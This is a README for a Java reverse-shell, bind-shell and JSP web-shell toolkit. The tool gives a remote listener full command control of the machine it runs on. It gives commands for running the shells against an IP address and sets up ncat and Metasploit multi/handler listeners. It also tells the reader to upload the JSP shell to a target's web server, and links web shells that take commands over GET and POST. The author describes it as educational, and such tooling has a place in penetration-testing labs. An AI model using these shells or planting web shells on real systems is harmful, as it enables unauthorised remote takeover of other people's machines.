# Java Reverse TCP

JAR files and JSP scripts for communicating with a remote host.

Remote host will have a full control over the client and all the underlying system commands.

Works on Linux OS and macOS with `/bin/sh` and Windows OS with `cmd.exe`. Program will automatically detect an underlying OS.

Works with both `ncat` and `multi/handler`.

Check the source code of JAR files:

* [/src/Reverse Shell/src/reverse/shell/ReverseShell.java](https://github.com/ivan-sincek/java-reverse-tcp/blob/main/src/Reverse%20Shell/src/reverse/shell/ReverseShell.java)
* [/src/Reverse Shell/src/reverse/shell/BindShell.java](https://github.com/ivan-sincek/java-reverse-tcp/blob/main/src/Bind%20Shell/src/bind/shell/BindShell.java)

Built with JDK v8 on Apache NetBeans IDE v12.2 (64-bit). All the files require Java SE v8 or greater to run.

JAR files were tested with Java v8 update 282 on Windows 10 Enterprise OS (64-bit) and Kali Linux v2021.2 (64-bit).

JSP scripts were tested on Apache Tomcat Version v7.0.100 on XAMPP for Windows v7.4.3 (64-bit).

Made for educational purposes. I hope it will help!

## How to Run (JAR)

Open your preferred console from [/jar/](https://github.com/ivan-sincek/java-reverse-tcp/tree/main/jar) and run the following commands:

```fundamental
java -jar Reverse_Shell.jar 192.168.8.185 9000

java -jar Bind_Shell.jar 9000
```

## How to Run (JSP)

**Change the IP address and port number inside the scripts as necessary.**

Copy [/jar/jsp_reverse_shell.jsp](https://github.com/ivan-sincek/java-reverse-tcp/blob/main/src/Web%20Shell/web/jsp_reverse_shell.jsp) to your server's web root directory (e.g. to \\xampp\\htdocs\\ on XAMPP) or upload it to your target's web server.

Navigate to the file with your preferred web browser.

---

Check the [simple JSP web shell](https://github.com/ivan-sincek/java-reverse-tcp/blob/main/src/Web%20Shell/web/simple_jsp_web_shell_post.jsp) based on HTTP POST request.

Check the [simple JSP web shell](https://github.com/ivan-sincek/java-reverse-tcp/blob/main/src/Web%20Shell/web/simple_jsp_web_shell_get.jsp) based on HTTP GET request. You must [URL encode](https://www.urlencoder.org) your commands.

## Set Up a Listener

To set up a listener, open your preferred console on Kali Linux and run one of the examples below.

Set up `ncat` listener:

```fundamental
ncat -nvlp 9000
```

Set up `multi/handler` listener:

```fundamental
msfconsole -q

use exploit/multi/handler

set PAYLOAD windows/shell_reverse_tcp

set LHOST 192.168.8.185

set LPORT 9000

exploit
```

## Images

<p align="center"><img src="https://github.com/ivan-sincek/java-reverse-tcp/blob/main/img/reverse_shell.jpg" alt="Reverse Shell"></p>

<p align="center">Figure 1 - Reverse Shell</p>

<p align="center"><img src="https://github.com/ivan-sincek/java-reverse-tcp/blob/main/img/ncat.png" alt="Ncat"></p>

<p align="center">Figure 2 - Ncat</p>
